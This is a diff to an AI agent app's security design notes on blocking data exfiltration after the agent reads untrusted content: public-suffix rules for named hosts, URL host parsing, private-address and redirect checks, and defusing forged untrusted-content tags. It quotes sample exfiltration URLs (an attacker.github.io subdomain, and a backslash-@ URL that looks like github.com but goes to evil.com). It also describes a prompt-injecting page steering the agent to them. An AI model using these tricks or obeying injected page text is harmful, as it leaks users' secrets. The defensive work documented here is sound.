@@ -44,11 +44,21 @@ Once a run is tainted, these calls are **gated**:
 
 "Named" hosts are:
 
-- hosts in what the user typed in this chat, whether full links or bare domains such as `bbc.co.uk`, plus their subdomains (`www.` is ignored);
+- hosts in what the user typed in this chat, whether full links or bare domains such as `bbc.co.uk`, plus their subdomains (`www.` is ignored), except under a public suffix (see "Shared hosting domains");
 - hosts the user set up in Locus (model providers, MCP servers and connectors);
 - the phone's own loopback, for servers the agent started in Linux.
 
 Text the agent read never adds a host. For a helper, only the parent chat's user messages count, because the helper's task was written by the agent.
+
+### Shared hosting domains
+
+Status: unreleased (#364). Code: `PublicSuffixes.kt`, `Taint.trusted`; the list is `core/agent/src/main/resources/dev/locus/core/agent/public_suffix_list.dat`. Tests: `TaintTest` ("naming a shared hosting domain …").
+
+`Taint.hostsIn` takes bare domains from what the user typed, and `Taint.trusted` accepted any subdomain of a named host. So "publish it to github.io" made `attacker.github.io` a named host, and a tainted run could open `https://attacker.github.io/?d=<secrets>` with no card. The same held for `vercel.app`, `pages.dev`, `netlify.app`, `ngrok.io`, `co.uk` and every other name under which anyone can get a site.
+
+A named host now covers its subdomains only when it isn't a public suffix by the [Public Suffix List](https://publicsuffix.org) (ICANN and private sections, wildcard and exception rules, and the implied `*` rule that makes any single label one). A public suffix the user names still counts by itself (`github.io` exactly), and anything under a registrable name keeps working: `docs.github.com` when the user typed `github.com`, `www.me.github.io` when they typed `me.github.io`. The rule is the same everywhere `Taint.trusted` decides (taint, disclosure, links in replies, browsing a named site, saved logins, provider drafts).
+
+The list is a snapshot bundled with the app (rules only, about 150 KB, version and commit in its header, MPL 2.0), read once on first use. No library is added: OkHttp has its own copy, but core:agent doesn't depend on OkHttp. To refresh it, download `https://publicsuffix.org/list/public_suffix_list.dat` and follow the file's header. If the file can't be read, every name counts as a public suffix, so only exact hosts are trusted.
 
 What a gated call does:
 
@@ -83,8 +93,10 @@ Taint is a policy decision inside `AgentLoop`. The system prompt, the tool list 
   - CGNAT 100.64/10, IPv6 unique-local fc00::/7, multicast, 0.0.0.0/8 or broadcast;
   - `.local`, `.lan` and `.home.arpa` names, and single-label names (`LocalNetwork.isLocalHost`).
 
-  The exception is a host the user set up in Locus: a provider's base URL (Ollama on the LAN) or an MCP server or connector. The refusal tells the agent to use `run_command` with `curl` for servers it started in Linux.
-- **Redirects** are followed by hand, at most 5 hops, and every hop is checked like the first. 301, 302 and 303 turn a POST into a GET without a body. An https to http downgrade is refused. Headers the agent set (an API key, say) go only to the host it named.
+  The ranges include IETF protocol assignments 192.0.0.0/24, benchmarking 198.18.0.0/15 and reserved 240.0.0.0/4, and an IPv6 address that carries an IPv4 one is judged by that IPv4 address: NAT64 `64:ff9b::/96` and IPv4-compatible `::a.b.c.d` (the last 32 bits), 6to4 `2002::/16` (bits 16 to 47). IPv4-mapped `::ffff:a.b.c.d` already arrives as IPv4.
+
+  The exception is an address the user set up in Locus: a provider's base URL (Ollama on the LAN) or a connector. It covers that address's origin (scheme, host and port, `FetchGuard.originOf`), not the whole host: with Ollama at `http://192.168.1.5:11434/v1`, fetch_url reaches `http://192.168.1.5:11434/…` and nothing else on that machine, such as its port 22 or a router page on `:8080` (#372). The DNS check at connect time (`FetchDns`) sees only names, so it allows the set-up hosts; the origin check runs before every hop. The refusal tells the agent to use `run_command` with `curl` for servers it started in Linux.
+- **Redirects** are followed by hand, at most 5 hops, and every hop is checked like the first. 301, 302 and 303 turn a POST into a GET without a body. An https to http downgrade is refused. Headers the agent set (an API key, say) go only to the origin it named: the same scheme, host and port, so not to `https://api.example.com:8443/` after a redirect from `https://api.example.com/`.
 - **Body cap.** The body is streamed and kept to at most 2 MB, whatever the server sends or claims. The result says when it stopped reading. The whole request has a 60 s limit.
 - **DNS rebinding.** The check resolves the name before the request, and OkHttp resolves it again to connect, so a rebinding server could answer differently the second time. fetch_url therefore has a client of its own (`FetchDns`, core/data) whose OkHttp `Dns` runs every answer through `FetchGuard.checkAnswer`. Any private address, for a host the user didn't set up, fails the connection, and each redirect hop is a new checked lookup. See [network](network.md), "fetch_url and DNS rebinding".
 
@@ -144,6 +156,18 @@ Both treat the destination host as the unit of trust and keep a short allowlist.
 - Calls that could gate run one at a time, never beside a private read (`RunTaint.couldGate`).
 
 What still works without a card after a private read: searching, opening a bare host, any host the user named or set up, local servers, and a second request to a host the run already opened.
+
+### One host for every decision
+
+Status: unreleased (#377). Code: `LocalNetwork.hostOf` and `LocalNetwork.plainHostOf` (core:model). Tests: `LocalNetworkTest`, `UrlHostParityTest` (core:data, against OkHttp's `HttpUrl`), `TaintTest`, `LinkGuardTest`.
+
+**What went wrong.** `LocalNetwork.hostOf` cut an address at its first `/` and took the part after the last `@`. Browsers (WHATWG URL), OkHttp and Ktor treat `\` as `/` in http(s) addresses. So Locus read `https://evil.com\@github.com/?d=secret` as github.com while the request went to evil.com, and every egress decision uses that host: taint's and disclosure's address rules, Allow site, links in replies, skill scopes. After a private read, a page could have the agent `browser_open` such an address to a host the user named, and nothing asked.
+
+**The host.** `hostOf` now reads http(s), ws(s) and ftp addresses the WHATWG way: tabs and line breaks are dropped, `\` counts as `/`, any run of slashes after the scheme is skipped (`https:evil.com`, `https:/\evil.com` and `https:///evil.com` all go to evil.com), and the authority ends at the first `/`, `\`, `?` or `#` before user info is cut off. An IPv6 literal is returned in its short form (`::1`), and an IPv4-mapped one as the IPv4 address OkHttp connects to (`[::ffff:7f00:1]` → `127.0.0.1`). Other forms (`host:port`, a bare host, `ssh://user@host`) read as before.
+
+**Addresses that could mislead.** A decision about where data may go uses `plainHostOf`, which is `hostOf` but null for an address with a `\`, a tab or line break, user info, a `%` in the authority, or an http(s) scheme not followed by exactly `//`. A null host is "an address it chose": in a tainted run or after a private read the call asks, the card offers no Allow site, a link in a reply after outside content asks (the sheet shows the real host), and a skill scope refuses it. Real pages and links never need these forms, so asking costs little. The browser's own record of a page (`PageActions`) is the WebView's canonical address and keeps using `hostOf`.
+
+Not handled: decimal or hex IPv4 hosts (`http://2130706433/`) and percent-encoded or Unicode lookalike hosts read as something no user named, so they ask rather than pass.
 
 ### Allowing a site for the rest of a task
 
@@ -294,7 +318,7 @@ Only to tool-result text from now on. The frozen system prompt and the declared 
 
 | Entry point | Where |
 |---|---|
-| Every marked tool result: `fetch_url`, `web_search`, `web_read`, `wikipedia`, email lists, bodies and subjects, GitHub issues, deploy logs, DNS records, `connector_call`, MCP results and `mcp_list_tools`, `find_tools`' MCP descriptions, command and SSH output, calendar entries, events, imported skills loaded with `skill_use` | `UntrustedContent.wrap`. It strips first and then defuses, so `</untrusted<ZWSP>_web_content>` with a zero-width space can't become a real closing tag once stripped. |
+| Every marked tool result: `fetch_url`, `web_search`, `web_read`, `wikipedia`, email lists, bodies and subjects, GitHub issues, deploy logs, DNS records, `connector_call`, MCP results and `mcp_list_tools`, `find_tools`' MCP descriptions, command and SSH output, calendar entries, events, imported skills loaded with `skill_use` | `UntrustedContent.wrap`. It strips first and then defuses, so `</untrusted<ZWSP>_web_content>` with a zero-width space can't become a real closing tag once stripped. Defusing also matches the tag in compatibility forms that NFKC turns into it (fullwidth `＜／＞` and letters, small-form `﹤﹥`; #378): each character is folded on its own to find the tag, and only the tag's brackets become `‹›`, so the rest of the text is unchanged. The safety reviewer's section tags (`<message>`, `<plan>` …) are neutralised the same way (`ReviewContext.neutralize`). |
 | Web pages, snapshots, tabs and console logs | core:browser's `Untrusted.wrap`, which now calls `UntrustedContent.wrap` |
 | MCP tool descriptions and argument schemas offered as deferred tools (provider-side tool search) | `McpSchemas.description` and `McpSchemas.compact`. These are outside any marked block, so every string in them is stripped. |
 | File reads | `read_file`, line by line, with a note that names the lines. `edit_file`'s whole-line matching compares lines without hidden characters, so the model can edit a line exactly as it read it. |
@@ -343,7 +367,7 @@ Limits:
 - Taint is per run, not per value. A tainted run asks for every outward call, including ones that only use the user's own data. That's the price of not tracking values.
 - `run_command` can reach the network by itself (`curl`), and it is a LOCAL tool, so it isn't gated by taint. Its normal Ask/Allow policy applies.
 - For remembered approvals only, the output of a plain local command that fetches nothing (`npm test`, `ls`) isn't counted as outside content, so a coding chat can still be offered "Don't ask again" after its first command. It still counts for every gate here. See [remembered approvals](remembered-approvals.md), "Taint".
-- The host check is textual. `docs.example.org` is trusted when the user typed `example.org`.
+- The host check is textual. `docs.example.org` is trusted when the user typed `example.org`; under a public suffix such as `github.io` only the named host is (see "Shared hosting domains"). The Public Suffix List is a snapshot, so a shared hosting domain added to it later counts as registrable until the snapshot is refreshed.
 - A host typed in the browser's address bar is named for that chat until the app restarts; it widens taint's trusted hosts the same way typing it in the chat does.
 - On a named site, a tainted run can click and type without a card. Submits still ask, but a page's own script can send on `input` events, so what is typed on a named site reaches that site. That is the site the user chose; typing after a private read still asks ("Typing after a private read").
 - Disclosure is per run too: after one `read_file`, a link with a path to any host the user didn't name asks. In practice that's per URL, since the first page read taints the run, and then taint asks for every unnamed address. **Allow site** on the card stops it for one host until the task ends ("Allowing a site for the rest of a task"). Hosts the user named or set up never ask.
